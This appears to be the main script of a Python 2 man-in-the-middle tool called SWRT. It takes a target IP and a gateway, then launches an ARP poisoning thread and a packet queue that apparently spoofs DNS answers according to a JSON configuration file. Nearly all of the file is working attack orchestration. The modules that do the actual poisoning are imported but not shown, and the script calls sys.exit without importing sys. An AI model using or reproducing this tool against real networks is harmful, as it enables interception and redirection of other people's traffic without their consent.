#!/usr/bin/env python2

import argparse
import os
import DNSConf
import multiprocessing
from ARPPoisoner import ARPPoisoner
from NetQueue import NetQueue

BLUE = '\033[94m'
END = '\033[0m'

class SWRT(object):
  args = 0
  def parseArgs(self):
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--debug", help="increase output verbosity", action="store_true", required=False)
    parser.add_argument('-i', action='store', default="ens33", dest='interface', help='Store the interface', required=False)
    parser.add_argument('-t', action='store', dest='target', help='Store a target IP address', required=True)
    parser.add_argument('-r', action='store', default="192.168.1.1", dest='gateway', help='Store the gateway IP address', required=False)
    parser.add_argument('-c', action='store', dest='conf', default='./conf.json', help='Store path/to/conf.json', required=False)
    SWRT.args = parser.parse_args()
 
  def printArgs(self):
    if SWRT.args.debug:
      print BLUE + " -- debug mode on"
    else:
      print  BLUE + "-- debug mode off"
      print " -- interface:" +  SWRT.args.interface
      print " -- target:" +  SWRT.args.target
      print " -- gateway:" +  SWRT.args.gateway + END

def main():    
  SWRT().parseArgs()
  SWRT().printArgs()
  
  if (SWRT.args.conf != None):
    conf = DNSConf.DNSConf(SWRT.args.interface, SWRT.args.conf)
  poisoner = ARPPoisoner(SWRT.args.target, SWRT.args.gateway, SWRT.args.interface)
  poisoner.daemon = True
  poisoner.start()
  q = NetQueue(SWRT.args, conf)
  q.start()
  try:
    #DNSfw.join()
    q.join()
  except KeyboardInterrupt:
    poisoner.stop()
    #DNSfw.stop()

if __name__ == '__main__':
  if os.getuid()!=0:
    print("Need root privileges to run properly; Re-run as sudo...")
    sys.exit(1)
  main()